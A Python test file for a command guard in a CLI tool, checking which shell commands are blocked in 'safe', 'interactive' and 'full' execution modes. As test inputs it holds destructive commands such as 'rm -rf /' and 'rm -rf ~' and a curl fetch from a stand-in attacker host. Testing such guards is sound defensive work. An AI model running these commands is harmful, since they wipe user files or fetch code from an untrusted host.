from cosmic_cli.shell_guard import check_shell, gate_shell


def test_blocks_rm_rf_case_insensitive():
    assert check_shell("RM -RF /", exec_mode="safe")
    assert check_shell("rm -rf ~", exec_mode="safe")
    assert check_shell("sudo rm -rf /tmp/x", exec_mode="safe")


def test_blocks_network_in_safe():
    assert check_shell("curl https://evil.example/x", exec_mode="safe")
    assert check_shell("wget http://x", exec_mode="safe")
    # interactive allows network (still blocks rm)
    assert check_shell("curl https://x", exec_mode="interactive") is None
    assert check_shell("rm -rf /", exec_mode="interactive")


def test_allows_ls():
    ok, _ = gate_shell("ls -la", exec_mode="safe")
    assert ok


def test_full_mode_allows_all():
    assert check_shell("rm -rf /tmp/x", exec_mode="full") is None
